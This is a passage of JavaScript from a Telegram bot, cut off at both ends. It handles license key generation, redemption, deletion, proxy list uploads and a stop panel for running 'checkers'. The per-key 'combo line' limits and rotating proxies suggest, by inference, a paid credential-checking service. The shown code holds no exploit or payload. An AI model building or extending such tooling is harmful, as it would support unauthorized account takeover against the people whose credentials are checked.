      const usernamePart = pName ? '@' + pName : String(u);
      usersLines.push(`    • <code>${target.slice(0, 8)}-${usernamePart}</code> ─ <code>${u}</code> ${activeBadge}`);
    }
  }
  const usersList = usersLines.length ? usersLines.join('\n') : '    <i>none yet</i>';

  tgSend(token, chatId,
    '🔍 <b>Key Details</b>\n\n' +
    `🔑 <code>${target}</code>\n\n` +
    '━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
    `📊 <b>Status:</b> ${status}\n` +
    `🏷 <b>Tier:</b> ${tierDisp}\n` +
    `🔤 <b>Format:</b> ${fmtDisp}\n` +
    `📝 <b>Label:</b> ${labelDisp}\n` +
    `📅 <b>Created:</b> ${created}\n` +
    `📅 <b>Expires:</b> ${expDt}\n` +
    `📦 <b>Combo Limit:</b> ${comboDisp}\n` +
    `👥 <b>Max Redemptions:</b> ${slotsUsed}/${slotsMax} used\n` +
    `📡 <b>Source:</b> ${source}\n` +
    `🆔 <b>Key ID:</b> <code>${entry.api_id || 'N/A'}</code>\n` +
    '━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
    `👤 <b>Users redeemed:</b>\n${usersList}`
  );
}

// ── Delete key helpers ──────────────────────────────────────────────────
function buildDeleteKeyKeyboard(keys, selected, now) {
  const rows = [];
  const sorted = Object.entries(keys).sort((a, b) => {
    const aActive = (a[1].expires || 0) > now ? 1 : 0;
    const bActive = (b[1].expires || 0) > now ? 1 : 0;
    if (aActive !== bActive) return bActive - aActive;
    return (b[1].expires || 0) - (a[1].expires || 0);
  });

  for (const [k, v] of sorted.slice(0, 20)) {
    const isExpired = now >= (v.expires || 0);
    const remaining = Math.max(0, Math.floor((v.expires || 0) - now));
    let usedBy = v.used_by || [];
    if (typeof usedBy === 'string') usedBy = usedBy ? [usedBy] : [];
    const maxU = v.max_users || 1;
    const slots = `${usedBy.length}/${maxU === 0 ? '∞' : maxU}`;
    const status = isExpired ? '❌' : `⏳${durLabel(remaining)}`;
    const tick = selected.has(k) ? '✅ ' : '';
    const label = `${tick}${k.slice(0, 8)}… ${status} 👥${slots}`;
    rows.push([{ text: label, callback_data: `dk_toggle:${k}` }]);
  }

  if (Object.keys(keys).length > 20) {
    rows.push([{ text: `⚠️ Showing 20/${Object.keys(keys).length} keys`, callback_data: 'dk_noop' }]);
  }

  rows.push([
    { text: '☑️ All Expired', callback_data: 'dk_sel:expired' },
    { text: '☑️ All Unused', callback_data: 'dk_sel:unused' },
    { text: '☑️ Select All', callback_data: 'dk_sel:all' },
  ]);

  const selCount = selected.size;
  const confirmLabel = selCount ? `🗑 Delete (${selCount})` : '🗑 Delete';
  rows.push([
    { text: confirmLabel, callback_data: 'dk_confirm' },
    { text: '🔲 Clear', callback_data: 'dk_sel:none' },
    { text: '❌ Cancel', callback_data: 'dk_cancel' },
  ]);
  return rows;
}

function deleteKeyHeader(keys, selected, now) {
  const total = Object.keys(keys).length;
  const active = Object.values(keys).filter(v => now < (v.expires || 0)).length;
  const expired = Object.values(keys).filter(v => now >= (v.expires || 0)).length;
  const sel = selected.size;
  return (
    '🗑 <b>Delete Keys</b>\n' +
    '━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
    `🔢 Total: <b>${total}</b>  ✅ Active: <b>${active}</b>  ❌ Expired: <b>${expired}</b>\n` +
    '━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
    (sel ? `🔘 <b>${sel} key(s) selected</b>` : '<i>Tap keys to select for deletion</i>') + '\n\n' +
    '<b>Key</b>  ·  <b>Status</b>  ·  <b>Used</b>'
  );
}

function handleDeleteKey(token, chatId, fromUser, keyArg) {
  if (!isOwner(fromUser)) {
    tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
    return;
  }

  const keys = loadKeys();
  const now = Date.now() / 1000;

  if (!Object.keys(keys).length) {
    tgSend(token, chatId, '📋 <b>No keys found.</b>');
    return;
  }

  // Direct one-shot commands: /deletekey expired|unused|all|KEY
  const args = (keyArg || '').trim();
  if (args) {
    if (args.toLowerCase() === 'expired') {
      const toDel = Object.entries(keys).filter(([k, v]) => now >= (v.expires || 0));
      if (!toDel.length) {
        tgSend(token, chatId, '✅ No expired keys to delete.');
        return;
      }
      (async () => {
        for (const [k, v] of toDel) {
          await deleteKeyFromApi(v);
          delete keys[k];
        }
        saveKeys(keys);
        tgSend(token, chatId,
          `🗑 <b>Deleted ${toDel.length} expired key(s).</b>\n<i>Remaining: ${Object.keys(keys).length}</i>`);
      })();
      return;
    }
    if (args.toLowerCase() === 'unused') {
      const toDel = Object.entries(keys).filter(([k, v]) => !v.used_by || (Array.isArray(v.used_by) && !v.used_by.length));
      if (!toDel.length) {
        tgSend(token, chatId, '✅ No unused keys to delete.');
        return;
      }
      (async () => {
        for (const [k, v] of toDel) {
          await deleteKeyFromApi(v);
          delete keys[k];
        }
        saveKeys(keys);
        tgSend(token, chatId,
          `🗑 <b>Deleted ${toDel.length} unused key(s).</b>\n<i>Remaining: ${Object.keys(keys).length}</i>`);
      })();
      return;
    }
    if (args.toLowerCase() === 'all') {
      const count = Object.keys(keys).length;
      (async () => {
        for (const entry of Object.values(keys)) {
          await deleteKeyFromApi(entry);
        }
        const empty = {};
        saveKeys(empty);
        delete deleteKeySelection[chatId];
        tgSend(token, chatId, `🗑 <b>All ${count} key(s) deleted.</b>`);
      })();
      return;
    }
    // Specific key
    const target = args.toUpperCase();
    if (!keys[target]) {
      tgSend(token, chatId, `❌ Key <code>${target}</code> not found.`);
      return;
    }
    const entry = keys[target];
    (async () => {
      await deleteKeyFromApi(entry);
      delete keys[target];
      saveKeys(keys);
      const expDt = new Date((entry.expires || 0) * 1000).toISOString().slice(0, 16).replace('T', ' ');
      const used = entry.used_by || 'never used';
      tgSend(token, chatId,
        '🗑 <b>Key Deleted</b>\n\n' +
        `🔑 <code>${target}</code>\n` +
        `📅 Was expiring: ${expDt}\n` +
        `👤 Used by: <code>${typeof used === 'object' ? JSON.stringify(used) : used}</code>`);
    })();
    return;
  }

  // Interactive picker
  deleteKeySelection[chatId] = new Set();
  tgSendButtons(token, chatId,
    deleteKeyHeader(keys, deleteKeySelection[chatId], now),
    buildDeleteKeyKeyboard(keys, deleteKeySelection[chatId], now)
  );
}

// ── Handle redeem ──────────────────────────────────────────────────────
function handleRedeem(token, chatId, fromUser, keyArg) {
  if (!keyArg || !keyArg.trim()) {
    botState[chatId] = 'AWAIT_REDEEM_KEY';
    tgSendButtons(token, chatId,
      '\ud83d\udd11 <b>Redeem Key</b>\n\n' +
      'Type your key in the chat, or tap the button below:\n\n' +
      '<i>Format: <code>/redeem YOUR_KEY</code></i>',
      [
        [{ text: '\u2328\ufe0f Type my key now', callback_data: 'redeem:prompt' }],
      ]
    );
    return;
  }

  (async () => {
    const result = await redeemKey(keyArg, fromUser, chatId);

    if (result.success) {
      const d = udata(chatId);
      d.key = result.key || keyArg;
      d.key_expires = result.key_expires;
      d.combo_limit = result.combo_limit || config.COMBO_LINE_LIMIT;
      d.key_tier = result.key_tier || 'free';
      saveProfile(chatId, d);

      // Notify owner about redemption
      if (result.ownerNotify && !result.alreadyRedeemed) {
        try {
          const n = result.ownerNotify;
          tgSend(token, config.getOwnerId(),
            '\ud83d\udd11 <b>Key Redeemed!</b>\n\n' +
            '\ud83d\udc64 <b>User:</b> ' + n.userName + (n.userUsername ? ' @' + n.userUsername : '') + '\n' +
            '\ud83c\udd94 <b>ID:</b> <code>' + n.userTgId + '</code>\n' +
            '\ud83d\udd11 <b>Key:</b> <code>' + n.keyShort + '</code>\n' +
            '\ud83d\udcca <b>Slots:</b> ' + n.slotsUsed + '/' + n.slotsMax + ' used'
          );
        } catch {}
      }

      // Show level picker after redeem
      if (typeof askLevel === 'function') {
        askLevel(token, chatId);
      } else {
        botState[chatId] = 'AWAIT_LEVEL';
      }
    }

    tgSend(token, chatId, result.message);
  })();
}

// ── Genkey wizard helpers (6 steps matching Python) ──────────────────────
function askGenkeyFormat(token, chatId) {
  const wiz = genkeyWizard[chatId] || {};
  const tierDisp = wiz.tier === 'vip' ? '⭐ VIP' : '🆓 Free';
  tgSendButtons(token, chatId,
    '🔑 <b>Generate Key — Step 2 of 6</b>\n\n' +
    `🏷 Tier: <b>${tierDisp}</b>\n\n` +
    '🔤 <b>Select Key Format:</b>\n\n' +
    '<i>How should the key look?</i>',
    [
      [
        { text: 'UUID v4',      callback_data: 'gk_fmt:uuid' },
        { text: 'HEX-32',       callback_data: 'gk_fmt:hex' },
      ],
      [
        { text: 'ALPHANUM-24',  callback_data: 'gk_fmt:alphanum' },
        { text: 'PREFIX-KEY',   callback_data: 'gk_fmt:prefix' },
      ],
      [
        { text: '❌ Cancel', callback_data: 'gk_cancel' },
      ],
    ]
  );
}

function askGenkeyExpiry(token, chatId) {
  const wiz = genkeyWizard[chatId] || {};
  const tierDisp = wiz.tier === 'vip' ? '⭐ VIP' : '🆓 Free';
  const fmtDisp = (wiz.format || 'uuid').toUpperCase();
  tgSendButtons(token, chatId,
    '🔑 <b>Generate Key — Step 3 of 6</b>\n\n' +
    `🏷 Tier: <b>${tierDisp}</b>\n` +
    `🔤 Format: <b>${fmtDisp}</b>\n\n` +
    '⏳ <b>Select Expiry:</b>\n\n' +
    '<i>Pick a preset or type custom (e.g. 1d, 12h, 2w, 3mo):</i>',
    [
      [
        { text: '1 Hour',   callback_data: 'gk_exp_h:1' },
        { text: '6 Hours',  callback_data: 'gk_exp_h:6' },
        { text: '12 Hours', callback_data: 'gk_exp_h:12' },
      ],
      [
        { text: '1 Day',    callback_data: 'gk_exp:1' },
        { text: '3 Days',   callback_data: 'gk_exp:3' },
        { text: '7 Days',   callback_data: 'gk_exp:7' },
      ],
      [
        { text: '30 Days',  callback_data: 'gk_exp:30' },
        { text: '90 Days',  callback_data: 'gk_exp:90' },
        { text: '1 Year',   callback_data: 'gk_exp:365' },
      ],
      [
        { text: '♾ Never',  callback_data: 'gk_exp:0' },
      ],
      [
        { text: '❌ Cancel', callback_data: 'gk_cancel' },
      ],
    ]
  );
}

function wizExpiryDisp(wiz) {
  const secs = wiz.expiry_seconds || 0;
  if (secs > 0) return durLabel(secs);
  const days = wiz.expiry_days || 0;
  if (days > 0) return `${days}d`;
  return 'Never';
}

function askGenkeyCombo(token, chatId) {
  const wiz = genkeyWizard[chatId] || {};
  const tierDisp = wiz.tier === 'vip' ? '⭐ VIP' : '🆓 Free';
  const fmtDisp = (wiz.format || 'uuid').toUpperCase();
  const expDisp = wizExpiryDisp(wiz);
  tgSendButtons(token, chatId,
    '🔑 <b>Generate Key — Step 4 of 6</b>\n\n' +
    `🏷 Tier: <b>${tierDisp}</b>\n` +
    `🔤 Format: <b>${fmtDisp}</b>\n` +
    `⏳ Expiry: <b>${expDisp}</b>\n\n` +
    '📦 <b>Select Combo Limit:</b>\n\n' +
    '<i>Pick a preset or type a custom number:</i>',
    [
      [
        { text: '500 lines',    callback_data: 'gk_lim:500' },
        { text: '1,000 lines',  callback_data: 'gk_lim:1000' },
        { text: '2,500 lines',  callback_data: 'gk_lim:2500' },
      ],
      [
        { text: '5,000 lines',  callback_data: 'gk_lim:5000' },
        { text: '10,000 lines', callback_data: 'gk_lim:10000' },
        { text: '∞ Unlimited',  callback_data: 'gk_lim:0' },
      ],
      [
        { text: '❌ Cancel', callback_data: 'gk_cancel' },
      ],
    ]
  );
}

function askGenkeyRedeems(token, chatId) {
  const wiz = genkeyWizard[chatId] || {};
  const tierDisp = wiz.tier === 'vip' ? '⭐ VIP' : '🆓 Free';
  const fmtDisp = (wiz.format || 'uuid').toUpperCase();
  const expDisp = wizExpiryDisp(wiz);
  const comboDisp = wiz.combo_limit === 0 ? '∞ Unlimited' : `${(wiz.combo_limit || 1000).toLocaleString()} lines`;
  tgSendButtons(token, chatId,
    '🔑 <b>Generate Key — Step 5 of 6</b>\n\n' +
    `🏷 Tier: <b>${tierDisp}</b>\n` +
    `🔤 Format: <b>${fmtDisp}</b>\n` +
    `⏳ Expiry: <b>${expDisp}</b>\n` +
    `📦 Combo: <b>${comboDisp}</b>\n\n` +
    '👥 <b>Max Redemptions:</b>\n\n' +
    '<i>Pick a preset or type a custom number:</i>',
    [
      [
        { text: '1',    callback_data: 'gk_usr:1' },
        { text: '5',    callback_data: 'gk_usr:5' },
        { text: '10',   callback_data: 'gk_usr:10' },
      ],
      [
        { text: '50',   callback_data: 'gk_usr:50' },
        { text: '100',  callback_data: 'gk_usr:100' },
        { text: '∞',    callback_data: 'gk_usr:0' },
      ],
      [
        { text: '❌ Cancel', callback_data: 'gk_cancel' },
      ],
    ]
  );
}

function askGenkeyCount(token, chatId) {
  const wiz = genkeyWizard[chatId] || {};
  const tierDisp = wiz.tier === 'vip' ? '⭐ VIP' : '🆓 Free';
  const fmtDisp = (wiz.format || 'uuid').toUpperCase();
  const expDisp = wizExpiryDisp(wiz);
  const comboDisp = wiz.combo_limit === 0 ? '∞ Unlimited' : `${(wiz.combo_limit || 1000).toLocaleString()} lines`;
  const redeemsDisp = wiz.max_users === 0 ? '∞ Unlimited' : String(wiz.max_users || 1);
  tgSendButtons(token, chatId,
    '🔑 <b>Generate Key — Step 6 of 6</b>\n\n' +
    `🏷 Tier: <b>${tierDisp}</b>\n` +
    `🔤 Format: <b>${fmtDisp}</b>\n` +
    `⏳ Expiry: <b>${expDisp}</b>\n` +
    `📦 Combo: <b>${comboDisp}</b>\n` +
    `👥 Redeems: <b>${redeemsDisp}</b>\n\n` +
    '🔢 <b>How many keys to generate?</b>',
    [
      [
        { text: '1 key',    callback_data: 'gk_cnt:1' },
        { text: '5 keys',   callback_data: 'gk_cnt:5' },
        { text: '10 keys',  callback_data: 'gk_cnt:10' },
      ],
      [
        { text: '25 keys',  callback_data: 'gk_cnt:25' },
        { text: '50 keys',  callback_data: 'gk_cnt:50' },
        { text: '100 keys', callback_data: 'gk_cnt:100' },
      ],
      [
        { text: '❌ Cancel', callback_data: 'gk_cancel' },
      ],
    ]
  );
}

function finalizeGenKey(token, chatId) {
  const wiz = genkeyWizard[chatId];
  if (!wiz) return;

  const tier = wiz.tier || 'free';
  const keyFormat = wiz.format || 'uuid';
  const expiryDays = wiz.expiry_days || 0;
  const expirySeconds = wiz.expiry_seconds || 0;
  const comboLimit = wiz.combo_limit || 0;
  const maxRedemptions = wiz.max_users || 1;
  const count = wiz.count || 1;
  const label = wiz.label || '';

  const now = Date.now() / 1000;
  const duration = expirySeconds > 0 ? expirySeconds : (expiryDays > 0 ? expiryDays * 86400 : 0);
  const expires = duration > 0 ? now + duration : now + 86400 * 36500;

  (async () => {
    const keys = loadKeys(false);
    const newKeys = [];
    const api = getKeySystemAPI();

    // Try KeyVault API first
    let apiKeys = [];
    if (api && api.enabled) {
      try {
        apiKeys = await api.generateKey(
          duration > 0 ? duration : 86400 * 365,
          maxRedemptions,
          comboLimit,
          count,
          tier,
          keyFormat,
          label,
        );
      } catch (e) {
        console.warn(`[BOT] KeyVault API generate failed: ${e.message}`);
      }
    }

    if (apiKeys && apiKeys.length) {
      for (const apiKeyData of apiKeys) {
        const k = apiKeyData.key || genLocalKey(keyFormat, tier);
        keys[k] = {
          expires:          expires,
          combo_limit:      comboLimit,
          max_users:        maxRedemptions,
          used_by:          [],
          created:          now,
          api_id:           apiKeyData.id || '',
          source:           'keyvault',
          tier:             tier,
          format:           keyFormat,
          label:            label || apiKeyData.label || '',
          redemption_count: 0,
        };
        newKeys.push(k);
      }
    } else {
      for (let i = 0; i < count; i++) {
        const k = genLocalKey(keyFormat, tier);
        keys[k] = {
          expires:          expires,
          combo_limit:      comboLimit,
          max_users:        maxRedemptions,
          used_by:          [],
          created:          now,
          source:           'local',
          tier:             tier,
          format:           keyFormat,
          label:            label,
          redemption_count: 0,
        };
        newKeys.push(k);
      }
    }

    saveKeys(keys);
    delete genkeyWizard[chatId];

    // Display fields matching KeyVault dashboard
    const tierDisp = tier === 'vip' ? '⭐ VIP' : '🆓 Free';
    const fmtDisp = keyFormat.toUpperCase();
    const comboDisp = comboLimit === 0 ? '∞ Unlimited' : `${comboLimit.toLocaleString()} lines`;
    const redeemsDisp = maxRedemptions === 0 ? '∞ Unlimited' : String(maxRedemptions);
    const expDisp = duration === 0 ? 'Never' : durLabel(duration);
    const expDt = duration === 0 ? 'Never' : new Date(expires * 1000).toISOString().slice(0, 16).replace('T', ' ');
    const labelDisp = label || '(none)';

    if (count === 1) {
      tgSend(token, chatId,
        '✅ <b>Key Generated Successfully!</b>\n\n' +
        '━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
        `🔑 <b>Key:</b>\n<code>${newKeys[0]}</code>\n\n` +
        `🏷 <b>Tier:</b> ${tierDisp}\n` +
        `🔤 <b>Format:</b> ${fmtDisp}\n` +
        `📝 <b>Label:</b> ${labelDisp}\n` +
        `⏳ <b>Expiry:</b> ${expDisp}\n` +
        `📅 <b>Expires:</b> ${expDt}\n` +
        `📦 <b>Combo Limit:</b> ${comboDisp}\n` +
        `👥 <b>Max Redemptions:</b> ${redeemsDisp}\n` +
        '━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n' +
        `<i>Share this key — up to ${redeemsDisp} users can redeem it.</i>`
      );
    } else {
      tgSend(token, chatId,
        `✅ <b>${count} Keys Generated!</b>\n\n` +
        '━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
        `🏷 <b>Tier:</b> ${tierDisp}\n` +
        `🔤 <b>Format:</b> ${fmtDisp}\n` +
        `⏳ <b>Expiry:</b> ${expDisp}\n` +
        `📅 <b>Expires:</b> ${expDt}\n` +
        `📦 <b>Combo Limit:</b> ${comboDisp}\n` +
        `👥 <b>Max Redemptions:</b> ${redeemsDisp}\n` +
        `🔢 <b>Total keys:</b> ${count}\n` +
        '━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n' +
        '<i>Keys attached below as .txt file.</i>'
      );
      // Send as file attachment
      try {
        const txtContent = newKeys.join('\n') + '\n';
        const ts = new Date().toISOString().replace(/[-:T]/g, '').slice(0, 15);
        const fname = `keys_${count}_${ts}.txt`;
        tgSendDocument(token, chatId, fname, Buffer.from(txtContent, 'utf-8'),
          `🔑 <b>${count} keys</b> · ${tierDisp} · ${expDisp} · ${comboDisp} · ${redeemsDisp} redeems`
        );
      } catch (e) {
        // Fallback: send keys in chunks
        console.warn(`[BOT] Key file send failed: ${e.message}`);
        for (let i = 0; i < newKeys.length; i += 20) {
          const chunk = newKeys.slice(i, i + 20);
          tgSend(token, chatId,
            `🔑 <b>Keys ${i + 1}–${i + chunk.length}:</b>\n\n` +
            chunk.map(k => `<code>${k}</code>`).join('\n'));
        }
      }
    }
  })();
}

// ── Handle /keysystem command ──────────────────────────────────────────
function handleKeySystemConfig(token, chatId, fromUser, args) {
  if (!isOwner(fromUser)) {
    tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
    return;
  }

  const api = getKeySystemAPI();
  const parts = args.trim().split(/\s+/);
  const subcmd = (parts[0] || '').toLowerCase();
  const value = parts.slice(1).join(' ').trim();

  if (!subcmd) {
    // Show current config
    const status = api.enabled ? '✅ Connected' : '❌ Not configured';
    const urlDisplay = api.base_url || '<i>not set</i>';
    const secretDisplay = api.admin_secret ? '***' : '<i>not set</i>';
    tgSend(token, chatId,
      `🔗 <b>KeyVault API Config</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `📡 <b>Status:</b> ${status}\n` +
      `🌐 <b>URL:</b> ${urlDisplay}\n` +
      `🔐 <b>Secret:</b> ${secretDisplay}\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `<b>Usage:</b>\n` +
      `  <code>/keysystem url https://your-app.vercel.app</code>\n` +
      `  <code>/keysystem secret YOUR_ADMIN_SECRET</code>\n` +
      `  <code>/keysystem status</code> — test connection`
    );
    return;
  }

  if (subcmd === 'url') {
    if (!value) {
      tgSend(token, chatId, '❌ Provide a URL: <code>/keysystem url https://...</code>');
      return;
    }
    const cfg = config.loadConfig() || {};
    cfg.keysystem_url = value.replace(/\/+$/, '');
    config.saveConfig(cfg);
    api.reloadConfig();
    resetKeySystemAPI(); // recreate singleton with new config
    tgSend(token, chatId,
      `✅ <b>KeyVault URL set!</b>\n\n` +
      `🌐 <code>${value}</code>\n\n` +
      `<i>Use /keysystem status to test the connection.</i>`
    );
    return;
  }

  if (subcmd === 'secret') {
    if (!value) {
      tgSend(token, chatId, '❌ Provide the secret: <code>/keysystem secret YOUR_SECRET</code>');
      return;
    }
    const cfg = config.loadConfig() || {};
    cfg.keysystem_admin_secret = value;
    config.saveConfig(cfg);
    api.reloadConfig();
    resetKeySystemAPI();
    tgSend(token, chatId,
      `✅ <b>Admin secret updated!</b>\n\n` +
      `<i>Use /keysystem status to test the connection.</i>`
    );
    return;
  }

  if (subcmd === 'status') {
    if (!api.enabled) {
      tgSend(token, chatId,
        '❌ <b>KeyVault not configured.</b>\n\n' +
        'Set the URL first: <code>/keysystem url https://your-app.vercel.app</code>'
      );
      return;
    }
    (async () => {
      try {
        const resp = await axios.get(
          `${api.base_url}/api/keys/list`,
          { headers: api._headers(), timeout: 10000 }
        );
        if (resp.status === 200) {
          const keyCount = Array.isArray(resp.data) ? resp.data.length : 0;
          tgSend(token, chatId,
            `✅ <b>KeyVault Connected!</b>\n\n` +
            `📡 ${api.base_url}\n` +
            `🔑 ${keyCount} key(s) in remote store\n\n` +
            `<i>Keys generated with /generate_key will now sync to KeyVault.</i>`
          );
        } else if (resp.status === 401) {
          tgSend(token, chatId,
            '🔐 <b>Authentication failed.</b>\n\n' +
            'Check your admin secret: <code>/keysystem secret YOUR_SECRET</code>'
          );
        } else {
          tgSend(token, chatId,
            `⚠️ <b>Unexpected response:</b> HTTP ${resp.status}\n\n` +
            `<code>${String(resp.data).slice(0, 200)}</code>`
          );
        }
      } catch (e) {
        tgSend(token, chatId,
          `❌ <b>Connection failed:</b>\n\n` +
          `<code>${e.message.slice(0, 200)}</code>\n\n` +
          `Check the URL: <code>/keysystem url ...</code>`
        );
      }
    })();
    return;
  }

  tgSend(token, chatId,
    '❌ Unknown sub-command.\n\n' +
    '<b>Usage:</b>\n' +
    '  <code>/keysystem</code> — show config\n' +
    '  <code>/keysystem url &lt;URL&gt;</code> — set API URL\n' +
    '  <code>/keysystem secret &lt;SECRET&gt;</code> — set admin secret\n' +
    '  <code>/keysystem status</code> — test connection'
  );
}

// ── Handle proxy upload ────────────────────────────────────────────────
async function handleProxyUpload(token, chatId, fromUser, msg) {
  const doc = msg?.document;
  if (doc) {
    const fileId = doc.file_id;
    const tmpPath = path.join(config.PROXY_DIR, `upload_${Date.now()}.txt`);
    const downloadResult = await tgDownloadFile(token, fileId, tmpPath);
    if (downloadResult) {
      const content = fs.readFileSync(tmpPath, 'utf-8');
      const lines = preprocessProxyText(content);
      const result = saveProxiesFromLines(lines);
      if (result) {
        geoRotator.reload();
        clearNoProxyWarning();
        persistProxies();
        tgSend(token, chatId,
          `✅ <b>Proxy file uploaded!</b>\n\n` +
          `📊 ${lines.length} lines processed\n` +
          `📡 Total proxies: <b>${geoRotator.total}</b>`);
      } else {
        tgSend(token, chatId, '❌ <b>No valid proxy lines found in file.</b>');
      }
      try { fs.unlinkSync(tmpPath); } catch {}
    } else {
      tgSend(token, chatId, '❌ <b>Failed to download proxy file.</b>');
    }
    return;
  }

  const text = msg?.text || '';
  if (!text || text.startsWith('/')) {
    tgSendButtons(token, chatId,
      '📡 <b>Proxy Upload</b>\n\nSend proxy lines or a file.\nYou can send multiple messages.',
      [
        [
          { text: '✅ Done (save all)', callback_data: 'proxy:done' },
          { text: '🗑 Clear & Cancel',  callback_data: 'proxy:cancel' },
        ],
      ]
    );
    return;
  }

  if (!proxyAccumulator[chatId]) proxyAccumulator[chatId] = [];
  const lines = text.split('\n');
  for (const line of lines) {
    const normalized = normalizeProxyLine(line);
    if (normalized) proxyAccumulator[chatId].push(normalized);
  }

  const count = proxyAccumulator[chatId].length;
  tgSendButtons(token, chatId,
    `📡 <b>${count} proxy line(s) received.</b>\n\nKeep sending more or tap Done:`,
    [
      [
        { text: '✅ Done (save all)', callback_data: 'proxy:done' },
        { text: '🗑 Clear & Cancel',  callback_data: 'proxy:cancel' },
      ],
    ]
  );
}

// ── Build stop keyboard ────────────────────────────────────────────────
function buildStopKeyboard(includeStopAll = false) {
  const keyboard = [];
  for (const [chatId, evt] of Object.entries(stopEvents)) {
    if (!evt.isSet()) {
      const bar = activeBars[chatId];
      const done  = bar?.done || 0;
      const total = bar?.total || 0;
      const pct = total > 0 ? `${(done/total*100).toFixed(1)}%` : '—';
      const saved = getSavedProfile(chatId);
      const label = saved?.username ? `@${saved.username}` : `id:${chatId}`;
      keyboard.push([{
        text: `🛑 Stop ${label} (${pct})`,
        callback_data: `stop_user:${chatId}`
      }]);
    }
  }

  if (includeStopAll && keyboard.length > 0) {
    keyboard.push([{ text: '☢️ Stop ALL', callback_data: 'stop_all' }]);
  }
  if (keyboard.length > 0) {
    keyboard.push([{ text: '❌ Keep running', callback_data: 'stop_cancel' }]);
  }

  const activeCount = Object.values(stopEvents).filter(e => !e.isSet()).length;
  return [keyboard, activeCount];
}

// ── Handle stop panel ──────────────────────────────────────────────────
function handleStopPanel(token, chatId, fromUser) {
  if (isOwner(fromUser)) {
    const [kb, count] = buildStopKeyboard(true);
    const text = count > 0
      ? `🛑 <b>Running Checkers (${count})</b>\n\nSelect one to stop:`
      : 'ℹ️ <b>No checkers are currently running.</b>';
    if (kb.length) {
      tgSendButtons(token, chatId, text, kb);
    } else {
      tgSend(token, chatId, text);
    }
  } else {
    const evt = stopEvents[chatId];
    if (evt && !evt.isSet()) {
      const bar = activeBars[chatId] || {};
      const done  = bar.done || 0;
      const total = bar.total || 0;
      const pct = total > 0 ? `${(done/total*100).toFixed(1)}%` : '—';
      tgSendButtons(token, chatId,
        `🛑 <b>Your checker is running</b>\n\n📊 Progress: <code>${done}/${total}</code> (${pct})\n\nTap below to stop it:`,
        [
          [{ text: `🛑 Stop my checker (${pct})`, callback_data: `stop_user:${chatId}` }],
          [{ text: '❌ Keep running', callback_data: 'stop_cancel' }],
        ]
      );
    } else {
      tgSend(token, chatId, 'ℹ️ <b>No checker is currently running.</b>');
    }
  }
}

// ── Handle callback query ──────────────────────────────────────────────
async function handleCallbackQuery(token, cq) {
  const cqId = cq.id;
  const fromUser = cq.from || {};
  const message = cq.message;
  const data = cq.data || '';

  tgAnswerCallback(token, cqId);

  if (!message) return;
  const chatId = message.chat?.id;
  if (!chatId) return;

  console.log(`[BOT] 🔘 callback data=${data} from=${fromUser.id} chat=${chatId}`);

  // ── Admin panel buttons ─────────────────────────────────────────────
  if (data === 'admin:genkey') {
    if (!isOwner(fromUser)) return;
    genkeyWizard[chatId] = { step: 'AWAIT_TIER' };
    tgSendButtons(token, chatId,
      '🔑 <b>Generate Key — Step 1 of 6</b>\n\n' +
      '🏷 <b>Select Tier:</b>\n\n' +
      '<i>Free = basic access  |  VIP = premium access + more threads</i>',
      [
        [
          { text: '🆓 Free',  callback_data: 'gk_tier:free' },
          { text: '⭐ VIP',   callback_data: 'gk_tier:vip' },
        ],
        [
          { text: '❌ Cancel', callback_data: 'gk_cancel' },
        ],
      ]
    );
    return;
  }

  if (data === 'admin:statuskey') {
    if (!isOwner(fromUser)) return;
    handleStatusKey(token, chatId, '');
    return;
  }

  if (data === 'admin:deletekey_menu') {
    if (!isOwner(fromUser)) return;
    const keys = loadKeys();
    if (!Object.keys(keys).length) {
      tgSend(token, chatId, '📊 <b>No keys found.</b>');
      return;
    }
    deleteKeySelection[chatId] = new Set();
    const now = Date.now() / 1000;
    tgSendButtons(token, chatId,
      deleteKeyHeader(keys, deleteKeySelection[chatId], now),
      buildDeleteKeyKeyboard(keys, deleteKeySelection[chatId], now)
    );
    return;
  }

  if (data === 'admin:serverstatus') {
    if (!isOwner(fromUser)) return;
    handleServerStatus(token, chatId);
    return;
  }

  if (data === 'admin:proxystatus') {
    if (!isOwner(fromUser)) return;
    handleProxyStatus(token, chatId);
    return;
  }

  if (data === 'admin:upload_proxy') {
    if (!isOwner(fromUser)) return;
    delete proxyAccumulator[chatId];
    delete proxyMsgIds[chatId];
    botState[chatId] = 'AWAIT_PROXY';
    handleProxyUpload(token, chatId, fromUser, {});
    return;
  }

  if (data === 'admin:keysystem') {
    if (!isOwner(fromUser)) return;
    handleKeySystemConfig(token, chatId, fromUser, '');
    return;
  }

  if (data === 'admin:refresh') {
    if (!isOwner(fromUser)) return;
    handleHelp(token, chatId, fromUser);
    return;
  }

  // ── Delete key picker ────────────────────────────────────────────────
  if (data.startsWith('dk_toggle:')) {
    if (!isOwner(fromUser)) return;
    const keyName = data.slice('dk_toggle:'.length);
    const sel = deleteKeySelection[chatId] || new Set();
    if (sel.has(keyName)) sel.delete(keyName); else sel.add(keyName);
    deleteKeySelection[chatId] = sel;
    const keys = loadKeys();
    const now = Date.now() / 1000;
    tgEditMessage(token, chatId, message.message_id,
      deleteKeyHeader(keys, sel, now),
      buildDeleteKeyKeyboard(keys, sel, now));
    return;
  }

  if (data.startsWith('dk_sel:')) {
    if (!isOwner(fromUser)) return;
    const action = data.slice('dk_sel:'.length);
    const keys = loadKeys();
    const now = Date.now() / 1000;
    const sel = deleteKeySelection[chatId] || new Set();
    if (action === 'expired') {
      for (const [k, v] of Object.entries(keys)) {
        if (now >= (v.expires || 0)) sel.add(k);
      }
    } else if (action === 'unused') {
      for (const [k, v] of Object.entries(keys)) {
        if (!v.used_by?.length) sel.add(k);
      }
    } else if (action === 'all') {
      for (const k of Object.keys(keys)) sel.add(k);
    } else if (action === 'none') {
      sel.clear();
    }
    deleteKeySelection[chatId] = sel;
    tgEditMessage(token, chatId, message.message_id,
      deleteKeyHeader(keys, sel, now),
